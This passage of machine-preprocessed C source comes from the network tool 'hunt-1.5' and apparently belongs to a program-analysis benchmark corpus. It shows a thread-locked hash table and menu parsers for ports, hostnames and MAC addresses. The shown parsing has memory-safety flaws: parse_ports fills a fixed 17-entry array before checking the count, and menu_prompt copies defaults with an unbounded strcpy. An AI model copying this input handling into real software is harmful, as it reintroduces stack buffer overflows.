      pthread_mutex_lock(& h->h_mutex);
      }
    }
  }
#line 257
  return;
}
}
#line 259 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
__inline static void __unlock___0(struct hash *h ) 
{ 
  pthread_t tmp ;

  {
#line 262
  if (! h->h_locked) {
    {
#line 263
    pthread_mutex_unlock(& h->h_mutex);
    }
  } else {
    {
#line 262
    tmp = pthread_self();
    }
#line 262
    if (h->h_locked_thr != tmp) {
      {
#line 263
      pthread_mutex_unlock(& h->h_mutex);
      }
    }
  }
#line 265
  return;
}
}
#line 267 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
void *hash_get(struct hash *h , unsigned int key , void *arg ) 
{ 
  int hv ;
  void *retval ;

  {
  {
#line 272
  __lock___0(h);
#line 273
  hv = __hash_find(h, key, arg);
  }
#line 273
  if (hv >= 0) {
#line 274
    retval = (h->h_table + hv)->ht_data;
  } else {
#line 276
    retval = (void *)0;
  }
  {
#line 277
  __unlock___0(h);
  }
#line 278
  return (retval);
}
}
#line 281 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
void *hash_remove(struct hash *h , unsigned int key , void *arg ) 
{ 
  void *retval ;
  int hv ;
  int tmp ;

  {
  {
#line 286
  __lock___0(h);
#line 287
  hv = __hash_find(h, key, arg);
  }
#line 287
  if (hv >= 0) {
    {
#line 288
    retval = (h->h_table + hv)->ht_data;
#line 289
    (h->h_table + hv)->ht_key = 0U;
#line 290
    (h->h_table + hv)->ht_data = (void *)0;
#line 291
    (h->h_items) --;
#line 292
    tmp = __hv_next();
#line 292
    __hash_remap(h, tmp);
    }
  } else {
#line 294
    retval = (void *)0;
  }
  {
#line 295
  __unlock___0(h);
  }
#line 296
  return (retval);
}
}
#line 299 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
int hash_put(struct hash *h , unsigned int key , void *data ) 
{ 
  int retval ;
  int tmp ;

  {
  {
#line 303
  __lock___0(h);
#line 304
  tmp = __hash_need_space(h);
  }
#line 304
  if (tmp) {
    {
#line 305
    __hash_new_space(h);
    }
  }
#line 306
  if (h->h_items == h->h_max_items) {
#line 307
    retval = -1;
  } else
#line 306
  if (! data) {
#line 307
    retval = -1;
  } else {
#line 309
    retval = 0;
  }
  {
#line 310
  __hash_put(h, key, data);
#line 311
  __unlock___0(h);
  }
#line 312
  return (retval);
}
}
#line 315 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
int hash_put_check(struct hash *h , unsigned int key , void *data , void *arg ) 
{ 
  int retval ;
  int tmp ;

  {
  {
#line 319
  __lock___0(h);
#line 320
  tmp = __hash_need_space(h);
  }
#line 320
  if (tmp) {
    {
#line 321
    __hash_new_space(h);
    }
  }
#line 322
  if (h->h_items == h->h_max_items) {
#line 323
    retval = -1;
  } else
#line 322
  if (! data) {
#line 323
    retval = -1;
  } else {
    {
#line 325
    retval = __hash_put_check(h, key, data, arg);
    }
  }
  {
#line 326
  __unlock___0(h);
  }
#line 327
  return (retval);
}
}
#line 331 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
int hash_count(struct hash *h ) 
{ 
  int retval ;

  {
  {
#line 335
  __lock___0(h);
#line 336
  retval = h->h_items;
#line 337
  __unlock___0(h);
  }
#line 338
  return (retval);
}
}
#line 341 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
void hash_lock(struct hash *h ) 
{ 
  pthread_t tmp ;

  {
#line 344
  if (! h->h_locked) {
    {
#line 345
    pthread_mutex_lock(& h->h_mutex);
#line 346
    h->h_locked_thr = pthread_self();
#line 347
    h->h_locked = 1;
    }
  } else {
    {
#line 344
    tmp = pthread_self();
    }
#line 344
    if (h->h_locked_thr != tmp) {
      {
#line 345
      pthread_mutex_lock(& h->h_mutex);
#line 346
      h->h_locked_thr = pthread_self();
#line 347
      h->h_locked = 1;
      }
    } else {
#line 349
      (h->h_locked) ++;
    }
  }
#line 351
  return;
}
}
#line 353 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
void hash_unlock(struct hash *h ) 
{ 


  {
#line 356
  (h->h_locked) --;
#line 356
  if (h->h_locked == 0) {
    {
#line 357
    pthread_mutex_unlock(& h->h_mutex);
    }
  }
#line 359
  return;
}
}
#line 367 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
void hash_iter_set(struct hash_iterator *i , struct hash *h ) 
{ 


  {
#line 369
  i->i_hash = h;
#line 370
  i->i_pos = 0;
#line 371
  return;
}
}
#line 373 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
void hash_iter_lock(struct hash_iterator *i ) 
{ 


  {
  {
#line 375
  hash_lock(i->i_hash);
  }
#line 376
  return;
}
}
#line 378 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
void hash_iter_unlock(struct hash_iterator *i ) 
{ 


  {
  {
#line 380
  hash_unlock(i->i_hash);
  }
#line 381
  return;
}
}
#line 383 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
void *hash_iter_get(struct hash_iterator *i , unsigned int *keyptr ) 
{ 
  struct hash *h ;
  void *data ;
  void *retval ;

  {
  {
#line 389
  h = i->i_hash;
#line 390
  data = (void *)0;
#line 391
  __lock___0(h);
  }
  {
#line 392
  while (1) {
    while_continue: /* CIL Label */ ;
#line 392
    if (! (i->i_pos < h->h_max_items)) {
#line 392
      goto while_break;
    }
#line 393
    data = (h->h_table + i->i_pos)->ht_data;
#line 394
    if (data) {
#line 395
      goto while_break;
    }
#line 392
    (i->i_pos) ++;
  }
  while_break: /* CIL Label */ ;
  }
#line 397
  if (i->i_pos < h->h_max_items) {
#line 397
    if (data) {
#line 398
      retval = data;
#line 399
      if (keyptr) {
#line 400
        *keyptr = (h->h_table + i->i_pos)->ht_key;
      }
    } else {
#line 402
      retval = (void *)0;
    }
  } else {
#line 402
    retval = (void *)0;
  }
  {
#line 403
  (i->i_pos) ++;
#line 404
  __unlock___0(h);
  }
#line 405
  return (retval);
}
}
#line 408 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/c/hash.c"
void hash_iter_end(struct hash_iterator *i ) 
{ 


  {
#line 410
  i->i_hash = (struct hash *)((void *)0);
#line 411
  i->i_pos = 0;
#line 412
  return;
}
}
#line 754 "/usr/include/pthread.h"
extern  __attribute__((__nothrow__)) int __sigsetjmp(struct __jmp_buf_tag *__env ,
                                                     int __savemask ) ;
#line 318 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/hunt.h"
unsigned int pkts_received ;
#line 318
unsigned int pkts_dropped ;
#line 318
unsigned int pkts_unhandled ;
#line 325
int packets_allocated ;
#line 334
int packet_count(void) ;
#line 360
int menu_choose_string(char *label , char *ret_buf , int buf_len , char *dfl ) ;
#line 364
int menu_choose_ports(char *label , int *ret_ports , char *dfl ) ;
#line 368
int menu_choose_host_mask_ports(char *label , unsigned int *ret_ip , unsigned int *ret_mask ,
                                unsigned int *ret_ports , char *dfl ) ;
#line 375
void print_new_conn_ind(int add_new ) ;
#line 454
unsigned short service_lookup(char *name ) ;
#line 570
void print_sniff_daemon(void) ;
#line 578
void print_mac_daemon(void) ;
#line 144 "/usr/include/netdb.h"
extern struct hostent *gethostbyname(char const   *__name ) ;
#line 183 "/usr/include/stdlib.h"
extern  __attribute__((__nothrow__)) long ( __attribute__((__nonnull__(1), __leaf__)) strtol)(char const   * __restrict  __nptr ,
                                                                                              char ** __restrict  __endptr ,
                                                                                              int __base ) ;
#line 129 "/usr/include/string.h"
extern  __attribute__((__nothrow__)) char *( __attribute__((__nonnull__(1,2), __leaf__)) strcpy)(char * __restrict  __dest ,
                                                                                                 char const   * __restrict  __src ) ;
#line 236
extern  __attribute__((__nothrow__)) char *( __attribute__((__nonnull__(1), __leaf__)) strchr)(char const   *__s ,
                                                                                               int __c )  __attribute__((__pure__)) ;
#line 538
extern  __attribute__((__nothrow__)) int ( __attribute__((__nonnull__(1,2), __leaf__)) strncasecmp)(char const   *__s1 ,
                                                                                                    char const   *__s2 ,
                                                                                                    size_t __n )  __attribute__((__pure__)) ;
#line 102 "/usr/include/setjmp.h"
extern  __attribute__((__nothrow__, __noreturn__)) void siglongjmp(struct __jmp_buf_tag *__env ,
                                                                   int __val ) ;
#line 21 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
static int menu_prompt(char *label , char *buf , int buf_size , char *dfl ) 
{ 
  size_t tmp ;

  {
#line 23
  if (! label) {
#line 24
    label = (char *)"";
  }
  {
#line 25
  set_tty_color((enum TTY_COLOR )15);
  }
#line 26
  if (dfl) {
    {
#line 27
    tmp = strlen((char const   *)label);
    }
#line 27
    if (tmp) {
      {
#line 28
      printf((char const   */* __restrict  */)"%s [%s]> ", label, dfl);
      }
    } else {
      {
#line 30
      printf((char const   */* __restrict  */)"[%s]> ", dfl);
      }
    }
  } else {
    {
#line 32
    printf((char const   */* __restrict  */)"%s> ", label);
    }
  }
  {
#line 33
  fgets((char */* __restrict  */)buf, buf_size, (FILE */* __restrict  */)stdin);
#line 34
  set_tty_color((enum TTY_COLOR )7);
  }
#line 35
  if ((int )*(buf + 0) == 10) {
#line 36
    if (dfl) {
      {
#line 37
      strcpy((char */* __restrict  */)buf, (char const   */* __restrict  */)dfl);
      }
    } else {
#line 39
      return (-1);
    }
  }
#line 41
  if ((int )*(buf + 0) == 120) {
#line 42
    return (-1);
  }
#line 43
  return (0);
}
}
#line 46 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
int parse_unr(char *buf , int min , int max ) 
{ 
  char *tmp ;
  int i ;
  long tmp___0 ;

  {
  {
#line 51
  tmp___0 = strtol((char const   */* __restrict  */)buf, (char **/* __restrict  */)(& tmp),
                   10);
#line 51
  i = (int )tmp___0;
  }
#line 52
  if (! *tmp) {
#line 52
    goto _L;
  } else
#line 52
  if ((int )*tmp == 10) {
    _L: /* CIL Label */ 
#line 52
    if (i >= min) {
#line 52
      if (i <= max) {
#line 53
        return (i);
      } else {
#line 55
        return (-1);
      }
    } else {
#line 55
      return (-1);
    }
  } else {
#line 55
    return (-1);
  }
}
}
#line 58 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
int parse_ports(char *buf , unsigned int *ret_ports ) 
{ 
  char *buf_p ;
  char *p ;
  char *d ;
  char *tmp ;
  int ports[17] ;
  int err ;
  int i ;
  int count___0 ;
  char *tmp___0 ;
  long tmp___1 ;
  long tmp___2 ;
  int tmp___3 ;
  long tmp___4 ;
  unsigned short tmp___5 ;
  int tmp___6 ;
  int tmp___7 ;

  {
#line 66
  buf_p = buf;
#line 67
  err = 0;
#line 68
  count___0 = 0;
  {
#line 69
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 69
    p = strtok((char */* __restrict  */)buf_p, (char const   */* __restrict  */)" ,;\t\n");
    }
#line 69
    if (! p) {
#line 69
      goto while_break;
    }
    {
#line 70
    buf_p = (char *)((void *)0);
#line 71
    d = strchr((char const   *)p, '-');
    }
#line 71
    if (d) {
#line 71
      goto _L;
    } else {
      {
#line 71
      d = strchr((char const   *)p, ':');
      }
#line 71
      if (d) {
        _L: /* CIL Label */ 
        {
#line 72
        tmp___0 = d;
#line 72
        d ++;
#line 72
        *tmp___0 = (char)0;
#line 73
        tmp___1 = strtol((char const   */* __restrict  */)p, (char **/* __restrict  */)(& tmp),
                         10);
#line 73
        i = (int )tmp___1;
        }
#line 74
        if (*tmp) {
#line 75
          err = 1;
#line 76
          goto while_break;
        }
        {
#line 78
        ports[count___0] = i;
#line 79
        ports[count___0] |= 1 << 16;
#line 80
        count___0 ++;
#line 81
        tmp___2 = strtol((char const   */* __restrict  */)d, (char **/* __restrict  */)(& tmp),
                         10);
#line 81
        i = (int )tmp___2;
        }
#line 82
        if (*tmp) {
#line 83
          err = 1;
#line 84
          goto while_break;
        }
#line 86
        tmp___3 = count___0;
#line 86
        count___0 ++;
#line 86
        ports[tmp___3] = i;
      } else {
        {
#line 88
        tmp___4 = strtol((char const   */* __restrict  */)p, (char **/* __restrict  */)(& tmp),
                         10);
#line 88
        i = (int )tmp___4;
        }
#line 89
        if (*tmp) {
          {
#line 90
          tmp___5 = service_lookup(p);
#line 90
          i = (int )tmp___5;
          }
#line 90
          if (i == 0) {
#line 91
            err = 1;
#line 92
            goto while_break;
          }
        }
#line 95
        tmp___6 = count___0;
#line 95
        count___0 ++;
#line 95
        ports[tmp___6] = i;
      }
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 98
  tmp___7 = count___0;
#line 98
  count___0 ++;
#line 98
  ports[tmp___7] = 0;
#line 99
  if (err) {
    {
#line 100
    printf((char const   */* __restrict  */)"bad ports\n");
    }
#line 101
    return (-1);
  } else
#line 99
  if (count___0 > 17) {
    {
#line 100
    printf((char const   */* __restrict  */)"bad ports\n");
    }
#line 101
    return (-1);
  } else {
    {
#line 103
    memcpy((void */* __restrict  */)ret_ports, (void const   */* __restrict  */)(ports),
           sizeof(int ) * (unsigned long )count___0);
    }
#line 104
    return (0);
  }
}
}
#line 108 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
static sigjmp_buf jmp_hostbyname  ;
#line 109 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
static int ctrl_c_signaled  ;
#line 111 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
static void ctrl_c_handler___0(int nr ) 
{ 
  int was_already_signaled ;

  {
#line 113
  was_already_signaled = ctrl_c_signaled;
#line 115
  ctrl_c_signaled = 1;
#line 116
  if (! was_already_signaled) {
    {
#line 117
    siglongjmp((struct __jmp_buf_tag *)(jmp_hostbyname), 1);
    }
  }
#line 118
  return;
}
}
#line 120 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
unsigned int parse_hostname(char *buf ) 
{ 
  struct sigaction sac ;
  struct sigaction old_sac ;
  sigset_t new_mask ;
  char *buf_p ;
  struct hostent *hent ;
  unsigned int ip ;
  unsigned short const   **tmp ;
  unsigned short const   **tmp___0 ;
  int tmp___1 ;

  {
#line 128
  buf_p = buf;
  {
#line 129
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 129
    tmp = __ctype_b_loc();
    }
#line 129
    if (! ((int const   )*(*tmp + (int )*buf_p) & 8)) {
      {
#line 129
      tmp___0 = __ctype_b_loc();
      }
#line 129
      if (! ((int const   )*(*tmp___0 + (int )*buf_p) & 4)) {
#line 129
        goto while_break;
      }
    }
#line 130
    buf_p ++;
  }
  while_break: /* CIL Label */ ;
  }
  {
#line 131
  *buf_p = (char)0;
#line 139
  hent = (struct hostent *)((void *)0);
#line 140
  tmp___1 = __sigsetjmp((struct __jmp_buf_tag *)(jmp_hostbyname), 0);
  }
#line 140
  if (tmp___1 == 0) {
    {
#line 141
    ctrl_c_signaled = 0;
#line 142
    sac.__sigaction_handler.sa_handler = & ctrl_c_handler___0;
#line 143
    sigemptyset(& sac.sa_mask);
#line 144
    sigaddset(& sac.sa_mask, 2);
#line 145
    sac.sa_flags = 268435456;
#line 146
    sigaction(2, (struct sigaction  const  */* __restrict  */)(& sac), (struct sigaction */* __restrict  */)(& old_sac));
#line 152
    hent = gethostbyname((char const   *)buf);
#line 154
    sigaction(2, (struct sigaction  const  */* __restrict  */)(& old_sac), (struct sigaction */* __restrict  */)((void *)0));
    }
  } else {
    {
#line 156
    hent = (struct hostent *)((void *)0);
#line 157
    press_key((char *)"\n-- operation canceled - press any key> ");
#line 158
    sigaction(2, (struct sigaction  const  */* __restrict  */)(& old_sac), (struct sigaction */* __restrict  */)((void *)0));
#line 159
    sigemptyset(& new_mask);
#line 160
    sigaddset(& new_mask, 2);
#line 161
    pthread_sigmask(1, (__sigset_t const   */* __restrict  */)(& new_mask), (__sigset_t */* __restrict  */)((void *)0));
    }
  }
#line 164
  if (hent) {
#line 165
    ip = *((unsigned int *)*(hent->h_addr_list + 0));
#line 166
    return (ip);
  } else {
    {
#line 168
    printf((char const   */* __restrict  */)"can\'t resolve name %s to host address\n",
           buf);
    }
#line 169
    return (4294967295U);
  }
}
}
#line 173 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
int parse_mac(char *buf , char *mac_ret ) 
{ 
  unsigned char mac[6] ;
  char *p ;
  char *tmp ;
  char *buf_p ;
  int count___0 ;
  int i ;
  int err ;
  long tmp___0 ;
  int tmp___1 ;

  {
#line 179
  buf_p = buf;
#line 180
  count___0 = 0;
#line 181
  err = 0;
  {
#line 182
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 182
    p = strtok((char */* __restrict  */)buf_p, (char const   */* __restrict  */)": \t\n");
    }
#line 182
    if (p) {
#line 182
      if (! (count___0 < 6)) {
#line 182
        goto while_break;
      }
    } else {
#line 182
      goto while_break;
    }
    {
#line 183
    buf_p = (char *)((void *)0);
#line 184
    tmp___0 = strtol((char const   */* __restrict  */)p, (char **/* __restrict  */)(& tmp),
                     16);
#line 184
    i = (int )tmp___0;
    }
#line 185
    if (*tmp) {
#line 186
      err = 1;
#line 187
      goto while_break;
    }
#line 189
    tmp___1 = count___0;
#line 189
    count___0 ++;
#line 189
    mac[tmp___1] = (unsigned char )i;
  }
  while_break: /* CIL Label */ ;
  }
#line 191
  if (count___0 != 6) {
#line 192
    err = 1;
  }
#line 193
  if (! err) {
    {
#line 194
    memcpy((void */* __restrict  */)mac_ret, (void const   */* __restrict  */)(mac),
           (size_t )6);
    }
#line 195
    return (0);
  } else {
    {
#line 197
    printf((char const   */* __restrict  */)"bad mac address\n");
    }
#line 198
    return (-1);
  }
}
}
#line 216 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
int menu_choose_unr(char *label , int min , int max , int dfl ) 
{ 
  char buf[64] ;
  char __dfl_buf[64] ;
  char *dfl_buf ;
  int i ;
  int tmp ;

  {
#line 221
  if (min > max) {
#line 222
    return (-1);
  }
#line 223
  if (min < 0) {
#line 224
    return (-1);
  } else
#line 223
  if (max < 0) {
#line 224
    return (-1);
  }
#line 225
  if (dfl < 0) {
#line 226
    dfl_buf = (char *)((void *)0);
  } else {
    {
#line 228
    sprintf((char */* __restrict  */)(__dfl_buf), (char const   */* __restrict  */)"%d",
            dfl);
#line 229
    dfl_buf = __dfl_buf;
    }
  }
  {
#line 231
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 232
    tmp = menu_prompt(label, buf, (int )sizeof(buf), dfl_buf);
    }
#line 232
    if (tmp < 0) {
#line 233
      return (-1);
    }
    {
#line 234
    i = parse_unr(buf, min, max);
    }
#line 234
    if (i >= 0) {
#line 235
      goto while_break;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 237
  return (i);
}
}
#line 240 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
int menu_choose_mac(char *label , unsigned char *mac_ret , char *dfl ) 
{ 
  char buf[512] ;
  int tmp ;
  int tmp___0 ;
  int tmp___1 ;
  int tmp___2 ;
  int tmp___3 ;
  int tmp___4 ;

  {
  {
#line 244
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 245
    tmp = menu_prompt(label, buf, (int )sizeof(buf), dfl);
    }
#line 245
    if (tmp < 0) {
#line 246
      return (-1);
    }
    {
#line 247
    tmp___0 = strncasecmp((char const   *)(buf), "my", (size_t )2);
    }
#line 247
    if (tmp___0 == 0) {
      {
#line 251
      memcpy((void */* __restrict  */)mac_ret, (void const   */* __restrict  */)(my_eth_mac),
             (size_t )6);
      }
#line 252
      return (0);
    } else {
      {
#line 247
      tmp___1 = strncasecmp((char const   *)(buf), "my eth", (size_t )6);
      }
#line 247
      if (tmp___1 == 0) {
        {
#line 251
        memcpy((void */* __restrict  */)mac_ret, (void const   */* __restrict  */)(my_eth_mac),
               (size_t )6);
        }
#line 252
        return (0);
      } else {
        {
#line 247
        tmp___2 = strncasecmp((char const   *)(buf), "my eth mac", (size_t )10);
        }
#line 247
        if (tmp___2 == 0) {
          {
#line 251
          memcpy((void */* __restrict  */)mac_ret, (void const   */* __restrict  */)(my_eth_mac),
                 (size_t )6);
          }
#line 252
          return (0);
        } else {
          {
#line 247
          tmp___3 = strncasecmp((char const   *)(buf), "my mac", (size_t )6);
          }
#line 247
          if (tmp___3 == 0) {
            {
#line 251
            memcpy((void */* __restrict  */)mac_ret, (void const   */* __restrict  */)(my_eth_mac),
                   (size_t )6);
            }
#line 252
            return (0);
          }
        }
      }
    }
    {
#line 254
    tmp___4 = parse_mac(buf, (char *)mac_ret);
    }
#line 254
    if (tmp___4 == 0) {
#line 255
      return (0);
    }
  }
  while_break: /* CIL Label */ ;
  }
}
}
#line 259 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
unsigned int menu_choose_hostname(char *label , char *dfl ) 
{ 
  char buf[256] ;
  unsigned int ip ;
  int tmp ;

  {
  {
#line 264
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 265
    tmp = menu_prompt(label, buf, (int )sizeof(buf), dfl);
    }
#line 265
    if (tmp < 0) {
#line 266
      return (4294967295U);
    }
    {
#line 267
    ip = parse_hostname(buf);
    }
#line 267
    if (ip != 4294967295U) {
#line 268
      goto while_break;
    }
  }
  while_break: /* CIL Label */ ;
  }
#line 270
  return (ip);
}
}
#line 274 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
int menu_choose_ports(char *label , int *ret_ports , char *dfl ) 
{ 
  char buf[512] ;
  int tmp ;
  int tmp___0 ;

  {
  {
#line 278
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 279
    tmp = menu_prompt(label, buf, (int )sizeof(buf), dfl);
    }
#line 279
    if (tmp < 0) {
#line 280
      return (-1);
    }
    {
#line 281
    tmp___0 = parse_ports(buf, (unsigned int *)ret_ports);
    }
#line 281
    if (tmp___0 == 0) {
#line 282
      return (0);
    }
  }
  while_break: /* CIL Label */ ;
  }
}
}
#line 286 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
int menu_choose_host_mask_ports(char *label , unsigned int *ret_ip , unsigned int *ret_mask ,
                                unsigned int *ret_ports , char *dfl ) 
{ 
  char buf[256] ;
  char *host_name ;
  char *mask_str ;
  char *ports_str ;
  unsigned int ip ;
  int with_mask ;
  int mask ;
  unsigned int ports[17] ;
  int tmp ;
  char *tmp___0 ;
  int tmp___1 ;

  {
  {
#line 295
  while (1) {
    while_continue: /* CIL Label */ ;
    {
#line 296
    tmp = menu_prompt(label, buf, (int )sizeof(buf), dfl);
    }
#line 296
    if (tmp < 0) {
#line 297
      return (-1);
    }
    {
#line 298
    tmp___0 = strchr((char const   *)(buf), '/');
    }
#line 298
    if (tmp___0) {
#line 299
      with_mask = 1;
    } else {
#line 301
      with_mask = 0;
    }
    {
#line 303
    host_name = strtok((char */* __restrict  */)(buf), (char const   */* __restrict  */)" /\t\n");
    }
#line 303
    if (! host_name) {
#line 304
      goto while_continue;
    }
    {
#line 305
    ip = parse_hostname(host_name);
    }
#line 305
    if (ip == 4294967295U) {
#line 306
      goto while_continue;
    }
#line 307
    if (with_mask) {
      {
#line 308
      mask_str = strtok((char */* __restrict  */)((void *)0), (char const   */* __restrict  */)" \t\n");
      }
#line 308
      if (! mask_str) {
#line 309
        goto while_continue;
      }
      {
#line 310
      mask = parse_unr(mask_str, 0, 32);
      }
#line 310
      if (mask < 0) {
#line 311
        goto while_continue;
      }
#line 312
      if (mask) {
#line 312
        mask = (int )(4294967295U >> (32 - mask));
      } else {
#line 312
        mask = 0;
      }
    } else
#line 314
    if (ip == 0U) {
#line 315
      mask = 0;
    } else
#line 316
    if ((ip & 2164260863U) == 0U) {
#line 317
      mask = 255;
    } else
#line 318
    if ((ip & 1090519039U) == 0U) {
#line 319
      mask = 65535;
    } else
#line 320
    if ((ip & 553648127U) == 0U) {
#line 321
      mask = 16777215;
    } else {
#line 323
      mask = -1;
    }
    {
#line 325
    ports_str = strtok((char */* __restrict  */)((void *)0), (char const   */* __restrict  */)"\n");
    }
#line 325
    if (ports_str) {
      {
#line 326
      tmp___1 = parse_ports(ports_str, ports);
      }
#line 326
      if (tmp___1 < 0) {
#line 327
        goto while_continue;
      }
    } else {
      {
#line 329
      memset((void *)(ports), 0, sizeof(ports));
      }
    }
    {
#line 330
    *ret_ip = ip;
#line 331
    *ret_mask = (unsigned int )mask;
#line 332
    memcpy((void */* __restrict  */)ret_ports, (void const   */* __restrict  */)(ports),
           sizeof(ports));
    }
#line 333
    return (0);
  }
  while_break: /* CIL Label */ ;
  }
}
}
#line 337 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
int menu_choose_host_mask_ports_dfl(char *label , unsigned int *ret_ip , unsigned int *ret_mask ,
                                    unsigned int *ret_ports , unsigned int dfl_ip ,
                                    unsigned int dfl_mask , int *dfl_ports ) 
{ 
  char dfl[256] ;
  char *buf_p ;
  int tmp ;
  char *tmp___0 ;
  int tmp___1 ;
  int tmp___2 ;
  int tmp___3 ;
  int tmp___4 ;

  {
  {
#line 343
  buf_p = dfl;
#line 344
  tmp = count_mask(dfl_mask);
#line 344
  tmp___0 = host_lookup(dfl_ip, hl_mode);
#line 344
  tmp___1 = sprintf((char */* __restrict  */)buf_p, (char const   */* __restrict  */)"%s/%d",
                    tmp___0, tmp);
#line 344
  buf_p += tmp___1;
  }
#line 345
  if (dfl_ports) {
#line 345
    if (*(dfl_ports + 0)) {
      {
#line 346
      tmp___2 = sprintf((char */* __restrict  */)buf_p, (char const   */* __restrict  */)" ");
#line 346
      buf_p += tmp___2;
#line 347
      tmp___3 = sprintf_db_ports((unsigned int *)dfl_ports, buf_p, (int )(& dfl[sizeof(dfl)] - buf_p),
                                 0);
#line 347
      buf_p += tmp___3;
      }
    }
  }
  {
#line 350
  tmp___4 = menu_choose_host_mask_ports(label, ret_ip, ret_mask, ret_ports, dfl);
  }
#line 350
  return (tmp___4);
}
}
#line 354 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
static pthread_mutex_t menucc_mutex  =    {{0, 0U, 0, 0U, 0, (short)0, (short)0, {(struct __pthread_internal_list *)0, (struct __pthread_internal_list *)0}}};
#line 355 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
static int menucc_in_menu  =    0;
#line 356 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
static int menucc_conn_ind  =    0;
#line 357 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
static char *menucc_label  ;
#line 358 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
static char *menucc_opt  ;
#line 359 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
static char menucc_dfl  ;
#line 360 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
static int menucc_conn_s  =    0;
#line 361 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
static int menucc_conn_s_old  =    0;
#line 366 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
void clear_new_conn_ind(void) 
{ 


  {
  {
#line 368
  pthread_mutex_lock(& menucc_mutex);
#line 369
  menucc_conn_s_old = menucc_conn_s;
#line 370
  pthread_mutex_unlock(& menucc_mutex);
  }
#line 371
  return;
}
}
#line 376 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
static int last  =    0;
#line 374 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
void print_new_conn_ind(int add_new ) 
{ 
  size_t tmp ;

  {
  {
#line 378
  pthread_mutex_lock(& menucc_mutex);
  }
#line 379
  if (add_new) {
#line 380
    menucc_conn_s ++;
  }
#line 382
  if (menucc_in_menu) {
#line 382
    if (menucc_conn_ind == 0) {
#line 382
      goto _L;
    } else
#line 382
    if (add_new == 0) {
#line 382
      goto _L;
    } else
#line 382
    if (last == 0) {
      _L: /* CIL Label */ 
#line 384
      if (menucc_conn_ind) {
        {
#line 385
        putchar('\r');
        }
#line 386
        if (menucc_conn_s != menucc_conn_s_old) {
          {
#line 387
          putchar('*');
#line 388
          last = 1;
          }
        } else {
          {
#line 390
          putchar('-');
#line 391
          last = 0;
          }
        }
      }
#line 394
      if (menucc_dfl) {
        {
#line 395
        tmp = strlen((char const   *)menucc_label);
        }
#line 395
        if (tmp) {
          {
#line 396
          printf((char const   */* __restrict  */)"%s [%c]> ", menucc_label, (int )menucc_dfl);
          }
        } else {
          {
#line 398
          printf((char const   */* __restrict  */)"[%c]> ", (int )menucc_dfl);
          }
        }
      } else {
        {
#line 400
        printf((char const   */* __restrict  */)"%s> ", menucc_label);
        }
      }
      {
#line 401
      fflush(stdout);
      }
    }
  }
  {
#line 403
  pthread_mutex_unlock(& menucc_mutex);
  }
#line 404
  return;
}
}
#line 406 "/home/june/repo/benchmarks/collector/temp/hunt-1.5/menu.c"
int menu_choose_char_nconn(char *label , char *opt , char dfl , int conn_ind ) 
{ 
  char buf[64] ;
  int i ;
  char *tmp ;

  {
  {
#line 411
  while (1) {
    while_continue: /* CIL Label */ ;
#line 412
    if (! label) {
#line 413
      label = (char *)"";
    }
    {
#line 414
    set_tty_color((enum TTY_COLOR )15);
#line 416
    pthread_mutex_lock(& menucc_mutex);
#line 417
    menucc_label = label;
#line 418
    menucc_opt = opt;
#line 419
    menucc_dfl = dfl;
#line 420
    menucc_in_menu = 1;
#line 421
    menucc_conn_ind = conn_ind;
#line 422
    pthread_mutex_unlock(& menucc_mutex);
#line 424
    print_new_conn_ind(0);
#line 426
    fgets((char */* __restrict  */)(buf), (int )sizeof(buf), (FILE */* __restrict  */)stdin);
#line 428
    pthread_mutex_lock(& menucc_mutex);
#line 429
    menucc_in_menu = 0;
#line 430
    pthread_mutex_unlock(& menucc_mutex);
#line 432
    set_tty_color((enum TTY_COLOR )7);
    }
